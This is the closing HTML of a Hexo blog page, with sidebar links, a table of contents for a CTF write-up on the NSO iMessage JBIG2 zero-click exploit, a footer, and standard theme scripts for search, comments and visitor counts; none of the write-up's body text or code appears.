                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://www.zhihu.com/people/sakura1328/activities" target="_blank" title="知乎">
                      
                        <i class="fa fa-fw fa-globe"></i>知乎</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://twitter.com/eternalsakura13" target="_blank" title="Twitter">
                      
                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://kiprey.github.io/" title="Kiprey" target="_blank">Kiprey</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://exp101t.blogspot.com/" title="Murasaki" target="_blank">Murasaki</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://elphet.blogspot.com" title="bobb" target="_blank">bobb</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://thunderjie.github.io/" title="Thunderj" target="_blank">Thunderj</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://dwfault.github.io/" title="dwfalut" target="_blank">dwfalut</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://p1umer.github.io/" title="P1umer" target="_blank">P1umer</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://pcat.cc/" title="pcat" target="_blank">pcat</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#realworldctf-2022-hso-writeup与nso-iMessage-0click漏洞分析"><span class="nav-number">1.</span> <span class="nav-text">realworldctf 2022 hso writeup与nso iMessage 0click漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#简介"><span class="nav-number">1.1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一、小叙"><span class="nav-number">1.2.</span> <span class="nav-text">一、小叙</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、环境搭建"><span class="nav-number">1.3.</span> <span class="nav-text">二、环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-本地环境搭建"><span class="nav-number">1.3.1.</span> <span class="nav-text">1. 本地环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-exploit-调试环境搭建"><span class="nav-number">1.3.2.</span> <span class="nav-text">2. exploit 调试环境搭建</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三、漏洞点"><span class="nav-number">1.4.</span> <span class="nav-text">三、漏洞点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#四、漏洞利用前置知识"><span class="nav-number">1.5.</span> <span class="nav-text">四、漏洞利用前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-JBIG2Decode"><span class="nav-number">1.5.1.</span> <span class="nav-text">1. JBIG2Decode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Segments-小叙"><span class="nav-number">1.5.2.</span> <span class="nav-text">2. Segments 小叙</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#a-EOFSeg"><span class="nav-number">1.5.3.</span> <span class="nav-text">a. EOFSeg</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#b-SymbolDictSeg"><span class="nav-number">1.5.4.</span> <span class="nav-text">b. SymbolDictSeg</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#c-PageInfoSeg"><span class="nav-number">1.5.5.</span> <span class="nav-text">c. PageInfoSeg</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#d-GenericRegionSeg"><span class="nav-number">1.5.6.</span> <span class="nav-text">d. GenericRegionSeg</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#e-GenericRefinementRegionSeg"><span class="nav-number">1.5.7.</span> <span class="nav-text">e. GenericRefinementRegionSeg</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#f-TextRegionSeg"><span class="nav-number">1.5.8.</span> <span class="nav-text">f. TextRegionSeg</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-JBIG2Encode"><span class="nav-number">1.5.9.</span> <span class="nav-text">3. JBIG2Encode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#a-encode-Bitmap"><span class="nav-number">1.5.10.</span> <span class="nav-text">a. encode Bitmap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#b-encode-segments"><span class="nav-number">1.5.11.</span> <span class="nav-text">b. encode segments</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#五、漏洞利用流程"><span class="nav-number">1.6.</span> <span class="nav-text">五、漏洞利用流程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-堆风水"><span class="nav-number">1.6.1.</span> <span class="nav-text">1. 堆风水</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#a-创建堆空洞"><span class="nav-number">1.6.2.</span> <span class="nav-text">a. 创建堆空洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#b-占据堆空洞"><span class="nav-number">1.6.3.</span> <span class="nav-text">b. 占据堆空洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-位运算原语"><span class="nav-number">1.6.4.</span> <span class="nav-text">2. 位运算原语</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-立即数运算原语"><span class="nav-number">1.6.5.</span> <span class="nav-text">3. 立即数运算原语</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-地址解引用原语"><span class="nav-number">1.6.6.</span> <span class="nav-text">4. 地址解引用原语</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-整体利用流程"><span class="nav-number">1.6.7.</span> <span class="nav-text">5. 整体利用流程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#六、参考"><span class="nav-number">1.7.</span> <span class="nav-text">六、参考</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">sakura</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  










  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
  
  <script type="text/javascript">
    var GUEST = ['nick','mail','link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item=>{
      return GUEST.indexOf(item)>-1;
    });
    new Valine({
        el: '#comments' ,
        verify: false,
        notify: false,
        appId: 'oSjxVuchxdK82iyIiuzHtfiV-gzGzoHsz',
        appKey: 'MK8tCWwU3RWlWQdEA0wOH8Dw',
        placeholder: 'Just go go',
        avatar:'mm',
        guest_info:guest,
        pageSize:'10' || 10,
    });
  </script>



  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  
  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
  <script>AV.initialize("oSjxVuchxdK82iyIiuzHtfiV-gzGzoHsz", "MK8tCWwU3RWlWQdEA0wOH8Dw");</script>
  <script>
    function showTime(Counter) {
      var query = new AV.Query(Counter);
      var entries = [];
      var $visitors = $(".leancloud_visitors");

      $visitors.each(function () {
        entries.push( $(this).attr("id").trim() );
      });

      query.containedIn('url', entries);
      query.find()
        .done(function (results) {
          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';

          if (results.length === 0) {
            $visitors.find(COUNT_CONTAINER_REF).text(0);
            return;
          }

          for (var i = 0; i < results.length; i++) {
            var item = results[i];
            var url = item.get('url');
            var time = item.get('time');
            var element = document.getElementById(url);

            $(element).find(COUNT_CONTAINER_REF).text(time);
          }
          for(var i = 0; i < entries.length; i++) {
            var url = entries[i];
            var element = document.getElementById(url);
            var countSpan = $(element).find(COUNT_CONTAINER_REF);
            if( countSpan.text() == '') {
              countSpan.text(0);
            }
          }
        })
        .fail(function (object, error) {
          console.log("Error: " + error.code + " " + error.message);
        });
    }

    function addCount(Counter) {
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      query.equalTo("url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {
            var counter = results[0];
            counter.fetchWhenSave(true);
            counter.increment("time");
            counter.save(null, {
              success: function(counter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(counter.get('time'));
              },
              error: function(counter, error) {
                console.log('Failed to save Visitor num, with error message: ' + error.message);
              }
            });
          } else {
            var newcounter = new Counter();
            /* Set ACL */
            var acl = new AV.ACL();
            acl.setPublicReadAccess(true);
            acl.setPublicWriteAccess(true);
            newcounter.setACL(acl);
            /* End Set ACL */
            newcounter.set("title", title);
            newcounter.set("url", url);
            newcounter.set("time", 1);
            newcounter.save(null, {
              success: function(newcounter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
              },
              error: function(newcounter, error) {
                console.log('Failed to create');
              }
            });
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    $(function() {
      var Counter = AV.Object.extend("Counter");
      if ($('.leancloud_visitors').length == 1) {
        addCount(Counter);
      } else if ($('.post-title-link').length > 1) {
        showTime(Counter);
      }
    });
  </script>



  

  

  
  

  

  

  

</body>
</html>
